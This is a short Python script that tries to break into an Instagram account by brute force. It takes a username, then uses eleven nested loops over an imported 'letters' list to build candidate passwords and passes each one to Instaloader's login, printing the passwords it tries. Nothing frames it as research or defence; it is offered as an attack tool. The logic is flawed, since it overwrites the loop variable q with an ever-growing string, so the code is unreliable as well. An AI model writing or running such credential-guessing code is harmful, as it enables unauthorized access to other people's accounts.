from instaloader import Instaloader, TwoFactorAuthRequiredException

def login_to_instagram(username, password):
    try:
        # Create an Instaloader object
        loader = Instaloader()
        
        # Set the username and password for login
        loader.login(username, password)
        
        # If login is successful, print a success message
        print("Login successful!", password)

    except TwoFactorAuthRequiredException:
        # Two-factor authentication is required
        print("Two-factor authentication is required.")
        
    except Exception as e:
        # An error occurred during login
        print("An error occurred during login:", e, password)


username = input('Enter your username: ')

import letters


for q in letters.letters:
    for w in letters.letters:
        for e in letters.letters:
            for r in letters.letters:
                for t in letters.letters:
                    for y in letters.letters:
                        for u in letters.letters:
                            for i in letters.letters:
                                for o in letters.letters:
                                    for p in letters.letters:
                                        for a in letters.letters:
                                            q=q+w+e+r+t+y+u+i+o+p+a
                                            login_to_instagram(username, q)
